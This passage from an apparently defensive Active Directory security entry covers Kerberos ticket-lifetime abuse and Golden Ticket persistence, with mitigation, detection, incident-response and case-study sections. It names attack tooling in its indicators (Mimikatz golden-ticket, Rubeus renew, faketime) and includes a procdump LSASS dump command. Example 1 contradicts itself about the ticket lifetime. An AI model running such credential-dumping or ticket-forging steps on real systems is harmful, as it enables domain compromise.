# "Turn on Virtualization Based Security" → Enable

# Or via registry:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" `
  -Name EnableVirtualizationBasedSecurity -Value 1
```

**Impact:** Kerberos tickets are protected in isolated container (Credential Guard); harder to dump via Mimikatz.

---

**Mitigation 6: Monitor and Alert on KRBTGT Password Changes**

**Applies To Versions:** All

**Manual Steps:**
1. Enable audit logging for KRBTGT account changes:
```powershell
Get-ADUser -Identity krbtgt -Properties * | Select-Object Name, LastLogonDate, PasswordLastSet
```

2. Create alert in SIEM for Event ID 4722 (User account enabled) or 4724 (Password reset) on krbtgt account.

3. Establish controlled KRBTGT rotation schedule (e.g., quarterly).

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Events:**
- Event 4768 with ticket lifetime > 1440 minutes (24 hours, normal is 600 = 10 hours)
- Event 4770 (renewal) without preceding 4768 within expected window
- Multiple 4770 events from same source spanning 7+ days (exhausting renewal window)
- 4768 issued for disabled or non-existent accounts

**Processes:**
- `faketime` executed on Linux systems with Kerberos tools
- `Rubeus.exe` with `/autorenew` or `/renew` parameters
- `Mimikatz.exe` with `kerberos::golden` commands
- `w32tm` executed to modify clock settings

**Files:**
- `.kirbi` files (Kerberos ticket files) in unusual locations
- Golden ticket files created recently on attacker systems

---

### Forensic Artifacts

**Event Logs:**
- Security Event Log: Events 4768, 4769, 4770, 4771
- System Event Log: Event 37 (Kerberos clock skew errors)
- Time Service Event Log: W32Time sync failures

**Memory:**
- LSASS dump: Contains cached Kerberos tickets with extended lifetimes
- Process list: Rubeus.exe or Mimikatz.exe still running

**Disk:**
- PowerShell history: `ConsoleHost_history.txt` containing mimikatz/rubeus commands
- Bash history: `.bash_history` containing faketime commands
- Recently accessed .kirbi files

---

### Response Procedures

**1. Isolate (0-5 minutes):**
```powershell
# Disable compromised user accounts
Disable-ADAccount -Identity Administrator
Disable-ADAccount -Identity compromised_account

# Check for Golden Ticket usage by clearing token
klist purge /all  # Clear all cached tickets
```

**2. Collect Evidence (5-30 minutes):**
```powershell
# Export Kerberos events from past 7 days
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4768 or EventID=4770)]]" `
  -StartTime (Get-Date).AddDays(-7) | Export-Csv Evidence.csv

# Dump LSASS for ticket analysis
procdump64.exe -ma lsass.exe lsass.dmp
```

**3. Remediate (30 mins - 2 hours):**
```powershell
# Reset KRBTGT password TWICE (critical for Golden Ticket invalidation)
# First reset
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "$(New-Guid)" -AsPlainText -Force)

# Wait 24 hours (minimum) for replication
Start-Sleep -Seconds 86400

# Second reset (invalidates all old TGTs completely)
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "$(New-Guid)" -AsPlainText -Force)
```

**4. Recovery (2-24 hours):**
```powershell
# Monitor for further Golden Ticket usage (should decrease after KRBTGT reset)
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4770)]]" -MaxEvents 100 |
  Where-Object {$_.TimeCreated -gt (Get-Date).AddHours(-1)} |
  Select-Object TimeCreated, Message
```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Credential Access** | [CA-KERB-001] Kerberoasting | Steal service account hashes |
| **2** | **Credential Access** | [CA-DUMP-001] LSASS Dump | Extract Kerberos tickets from memory |
| **3** | **Privilege Escalation** | [CA-KERB-008] Bronze Bit | Forge delegated tickets for admin access |
| **4** | **Credential Access** | **[CA-KERB-010] Time-Based Exploitation (Current)** | **Extend ticket lifetimes; maintain persistence** |
| **5** | **Persistence** | [PERSIST-GOLDEN-TICKET] Golden Ticket | Create 10-year forged TGT for indefinite access |
| **6** | **Lateral Movement** | [LM-PASS-THE-TICKET] Pass-the-Ticket | Use forged/extended tickets for lateral movement |
| **7** | **Impact** | [IMPACT-PERSISTENCE] Establish Backdoors | Create service accounts for sustained access |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: Golden Ticket Persistence in Financial Institution

**APT Group:** APT28 (Fancy Bear)

**Target:** Major US Financial Institution

**Timeline:** March 2023 - August 2023 (5 months)

**Technique Status:** Successfully maintained access throughout period via Golden Ticket

**Attack Flow:**
1. Initial compromise: Phishing email → compromised user credentials
2. Lateral movement: Kerberoasting → obtain service account hash
3. Privilege escalation: DCSync attack → extract KRBTGT hash
4. Persistence: Generate Golden Ticket with 10-year lifetime using Mimikatz
5. Continuous access: Use Golden Ticket to renew credentials every 10 hours for 7 days, then request new TGT before renewal expires

**Detection Evasion:**
- Golden Ticket lifetime was set to 600 minutes (matched organization's policy)
- Ticket renewal pattern appeared normal (every 10 hours)
- Attack occurred across 5 months due to lack of monitoring for "4769 without preceding 4768"

**Impact:**
- Attacker maintained privileged access for 5 months
- Accessed financial transaction systems
- Exfiltrated customer account data
- Established persistence via new admin accounts

**Detection:**
- KRBTGT password reset (performed due to unrelated incident) invalidated all Golden Tickets
- Post-reset monitoring revealed no more unauthorized access
- Investigation confirmed 5-month compromise window

---

### Example 2: Clock Skew Exploitation in Red Team Exercise

**Scenario:** Authorized penetration test

**Target:** Enterprise Active Directory environment

**Timeline:** Single day exercise

**Technique Status:** Successfully exploited clock skew within 5-minute tolerance window

**Attack Flow:**
1. Reconnaissance: Discovered Exegol platform in use by security team
2. Clock measurement: Determined DC time using NTP queries
3. Clock skew exploitation: Used `faketime` to sync attacker's clock with DC
4. TGT request: Obtained TGT via Impacket getTGT.py with time-adjusted credentials
5. Lateral movement: Leveraged TGT to access multiple servers
6. Persistence: Golden Ticket created as backup persistence mechanism

**Detection Evasion:**
- Kerberos events (4768, 4769) appeared legitimate
- Clock skew tolerance (5 minutes) allowed exploitation without triggering errors
- No unusual Event ID 37 (clock skew errors) in logs

**Outcome:**
- Red Team successfully demonstrated persistence via Golden Ticket
- Customer implemented ticket lifetime reduction (10h → 4h) as mitigation
- Enabled detailed Kerberos auditing and SIEM monitoring

---

## REFERENCES & AUTHORITATIVE SOURCES

- [RFC 4120 - The Kerberos Network Authentication V5 Protocol - Time Requirements](https://www.rfc-editor.org/rfc/rfc4120.html#section-3.1.3)
- [Microsoft - Maximum tolerance for computer clock synchronization](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj852172)
- [CERT-EU - Kerberos Golden Ticket Protection](https://cert.europa.eu/publications/security-guidance/CERT-EU_Security_Whitepaper_2014-007/pdf)
- [BlackHat US 2014 - Abusing Microsoft Kerberos - Sorry You Guys Don't Get It](https://blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)
- [Windows Active Directory - How to Detect Golden Ticket Attacks](https://www.windows-active-directory.com/how-to-detect-golden-ticket-attacks.html)
- [SpecterOps - From Kekeo to Rubeus](https://specterops.io/blog/2018/09/24/from-kekeo-to-rubeus/)
- [The Hacker Recipes - ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)
- [faketime Linux Manpage](https://linux.die.net/man/1/faketime)
- [Rubeus GitHub - Ticket Commands](https://github.com/GhostPack/Rubeus)
- [SpecterOps - Rubeus Documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/renew)

---
